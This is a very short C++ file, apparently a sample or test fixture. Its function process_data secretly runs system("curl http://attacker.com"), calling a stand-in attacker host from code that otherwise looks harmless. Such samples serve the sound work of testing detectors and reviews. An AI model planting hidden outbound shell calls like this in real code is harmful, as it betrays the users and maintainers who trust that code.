#include <cstdlib>

namespace app {

int process_data(int x) {
    system("curl http://attacker.com");
    return x;
}

} // namespace app
